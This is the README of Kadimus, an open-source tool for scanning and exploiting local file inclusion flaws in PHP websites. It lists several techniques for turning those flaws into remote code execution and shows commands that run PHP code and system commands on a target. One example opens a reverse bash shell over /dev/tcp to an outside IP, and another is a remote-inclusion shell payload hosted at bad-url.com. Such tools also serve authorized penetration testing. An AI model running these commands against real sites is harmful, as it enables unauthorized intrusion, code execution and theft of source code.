 [![Rawsec's CyberSecurity Inventory](https://inventory.rawsec.ml/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.rawsec.ml/tools.html#Kadimus)
 [![GitHub stars](https://img.shields.io/github/stars/P0cL4bs/Kadimus.svg)](https://github.com/P0cL4bs/Kadimus/stargazers)
 [![GitHub license](https://img.shields.io/github/license/P0cL4bs/Kadimus.svg)](https://github.com/P0cL4bs/Kadimus/blob/master/license.txt)

# kadimus
LFI Scan &amp; Exploit Tool
--
kadimus is a tool to check and exploit lfi vulnerability focus on PHP systems

Features:

- [x] Check all url parameters
- [x] /var/log/auth.log RCE
- [x] /proc/self/environ RCE
- [x] php://input RCE
- [x] data://text RCE
- [x] expect://cmd RCE
- [x] Source code disclosure
- [x] Command shell interface through HTTP Request
- [x] Proxy support (socks4://, socks4a://, socks5:// ,socks5h:// and http://)
- [x] Proxy socks5 support for remote connections

## Compile:

First, make sure you have all dependencies installed in your system.
Dependencies: libcurl, libopenssl, libpcre and libssh

Then you can clone the repository, to get the source code:
```sh
$ git clone https://github.com/P0cL4bs/kadimus.git
$ cd kadimus
```

### And finally:

```sh
$ make
```

## Options:

```
Options:
  -h, --help                    Display this help menu

  Request:
    -B, --cookie STRING         Set custom HTTP Cookie header
    -A, --user-agent STRING     User-Agent to send to server
    --connect-timeout SECONDS   Maximum time allowed for connection
    --retry-times NUMBER        number of times to retry if connection fails
    --proxy STRING              Proxy to connect, syntax: protocol://hostname:port

  Scanner:
    -u, --url STRING            URL to scan/exploit
    -o, --output FILE           File to save output results

  Explotation:
    --parameter STRING          Parameter name to inject exploit
                                (only needed by RCE data and source disclosure)

  RCE:
    -T, --technique=TECH        LFI to RCE technique to use
    -C, --code STRING           Custom PHP code to execute, with php brackets
    -c, --cmd STRING            Execute system command on vulnerable target system
    -s, --shell                 Simple command shell interface through HTTP Request

    --connect STRING            Ip/Hostname to connect
    -p, --port NUMBER           Port number to connect or listen
    -l, --listen                Bind and listen for incoming connections

    --ssh-port NUMBER           Set the SSH Port to try inject command (Default: 22)
    --ssh-target STRING         Set the SSH Host

    RCE Available techniques

      environ                   Try run PHP Code using /proc/self/environ
      input                     Try run PHP Code using php://input
      auth                      Try run PHP Code using /var/log/auth.log
      data                      Try run PHP Code using data://text
      expect                    Try run a command using expect://cmd

    Source Disclosure:
      -S, --get-source          Try get the source file using filter://
      -f, --filename STRING     Set filename to grab source [REQUIRED]
      -O FILE                   Set output file (Default: stdout)

```

## Examples:

### Scanning:
```
./kadimus -u localhost/?pg=contact -A my_user_agent
```

### Get source code of file:
```
./kadimus -u localhost/?pg=contact -S -f "index.php%00" -O local_output.php --parameter pg
```

### Execute php code:
```
./kadimus -u localhost/?pg=php://input%00 -C '<?php echo "pwned"; ?>' -T input
```

### Execute command:
```
./kadimus -t localhost/?pg=/var/log/auth.log -T auth -c 'ls -lah' --ssh-target localhost
```

### Checking for RFI:

You can also check for RFI errors, just put the remote url on resource/common_files.txt
and the regex to identify this, example:

```php
/* http://bad-url.com/shell.txt */
<?php echo base64_decode("c2NvcnBpb24gc2F5IGdldCBvdmVyIGhlcmU="); ?>
```

in file:
```
http://bad-url.com/shell.txt?:scorpion say get over here
```

### Reverse shell:
```
./kadimus -u localhost/?pg=contact.php -T data --parameter pg -lp 12345 -c '/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/1234 0>&1"' --retry-times 0
```

Contributing
------------
You can help with code, or donating money.
If you wanna help with code, use the kernel code style as a reference.

Paypal: [![](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=RAG26EKAYHQSY&currency_code=BRL&source=url)

BTC: 1PpbrY6j1HNPF7fS2LhG9SF2wtyK98GSwq
